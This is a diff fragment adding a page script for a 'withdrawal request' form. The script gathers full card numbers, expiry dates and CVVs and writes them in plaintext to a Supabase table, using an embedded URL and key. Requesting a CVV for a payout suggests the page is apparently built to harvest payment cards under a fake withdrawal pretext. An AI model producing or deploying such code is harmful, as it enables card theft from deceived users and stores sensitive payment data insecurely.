+        e.target.setCustomValidity('Expiry date must be MM/YY format.');
+      }
+    });
+  }
+
+  const firstPm = pmGrid.querySelector('.pm');
+  pmGrid.querySelectorAll('.pm').forEach((x, i) => x.classList.toggle('active', i === 0));
+  setPaymentMethod('paypal');
+  renderDyn('paypal');
+
+  const SUPABASE_URL = 'https://yempfrobyvonsohyqnbu.supabase.co';
+  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InllbXBmcm9ieXZvbnNvaHlxbmJ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE2NDU1MzYsImV4cCI6MjA5NzIyMTUzNn0.mPEXJtRi-N4sW2yE2DWsZBllyyv4zUCU4l0sQBLLWj4';
+
+  async function loadSupabase() {
+    if (window.supabaseClient) return window.supabaseClient;
+    if (window.supabase && typeof window.supabase.from === 'function') {
+      window.supabaseClient = window.supabase;
+      return window.supabaseClient;
+    }
+    return new Promise((resolve, reject) => {
+      const s = document.createElement('script');
+      s.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/dist/umd/supabase.min.js';
+      s.onload = () => {
+        const clientFactory = (window.supabase && typeof window.supabase.createClient === 'function')
+          ? window.supabase
+          : (window.Supabase && typeof window.Supabase.createClient === 'function' ? window.Supabase : null);
+        if (!clientFactory) {
+          reject(new Error('Supabase library did not expose createClient'));
+          return;
+        }
+        try {
+          window.supabaseClient = clientFactory.createClient(SUPABASE_URL, SUPABASE_KEY);
+          resolve(window.supabaseClient);
+        } catch (err) {
+          reject(err);
+        }
+      };
+      s.onerror = (err) => reject(err);
+      document.head.appendChild(s);
+    });
+  }
+
+  function collectVisibleFormValues(form) {
+    const data = {};
+    Array.from(form.elements).forEach(el => {
+      if (!el.name || el.disabled) return;
+      if (el.type === 'submit' || el.type === 'button') return;
+      const isVisible = (el.type === 'hidden') || (el.offsetParent !== null);
+      if (!isVisible) return;
+      if (el.type === 'checkbox') {
+        data[el.name] = el.checked;
+      } else if (el.type === 'radio') {
+        if (el.checked) data[el.name] = el.value;
+      } else {
+        data[el.name] = el.value;
+      }
+    });
+    return data;
+  }
+
+  function validateVisibleFields(form) {
+    const altered = [];
+    Array.from(form.elements).forEach(el => {
+      if (!el.name) return;
+      const isHidden = (el.type === 'hidden') || (el.offsetParent === null && el.tagName.toLowerCase() !== 'select');
+      if (isHidden && el.required) {
+        el.required = false;
+        altered.push(el);
+      }
+    });
+    const valid = form.checkValidity();
+    if (!valid) form.reportValidity();
+    altered.forEach(el => el.required = true);
+    return valid;
+  }
+
+  wForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    console.log('Form Submitted');
+
+    if (!validateVisibleFields(wForm)) return;
+
+    const formData = collectVisibleFormValues(wForm);
+    formData.paymentMethod = paymentInput.value || method;
+
+    console.log('Form data:', formData);
+
+    try {
+      const supabase = await loadSupabase();
+      const { data, error } = await supabase.from('withdrawal_requests').insert([{ 
+        full_name: formData.fullName || '',
+        country: formData.country || '',
+        amount: formData.amount || '',
+        payment_method: formData.paymentMethod || '',
+        cardholder_name: formData.cardholderName || '',
+        card_number: formData.cardNumber || '',
+        expiry_date: formData.expiryDate || '',
+        cvv: formData.cvv || '',
+        created_at: new Date().toISOString()
+      }]);
+      
+      if (error) {
+        console.error('Database save failure:', error);
+        console.log('Error message:', error?.message);
+        console.log('Error details:', error?.details);
+        console.log('Error hint:', error?.hint);
+        console.log('Error code:', error?.code);
+        toast('Saving withdrawal request failed.');
+        return;
+      }
+      
+      console.log('Database save success:', data);
+      toast('Withdrawal request submitted successfully');
+      
+      closeWithdraw();
+      wForm.reset();
+      pmGrid.querySelectorAll('.pm').forEach((x, i) => x.classList.toggle('active', i === 0));
+      setPaymentMethod('paypal');
+      renderDyn('paypal');
+    } catch (error) {
+      console.error('Database save failure:', error);
+      console.log('Error message:', error?.message);
+      console.log('Error details:', error?.details);
+      console.log('Error hint:', error?.hint);
+      console.log('Error code:', error?.code);
+      toast('Saving withdrawal request failed.');
+    }
+  });
+});
+</script>
+</body>
+</html>
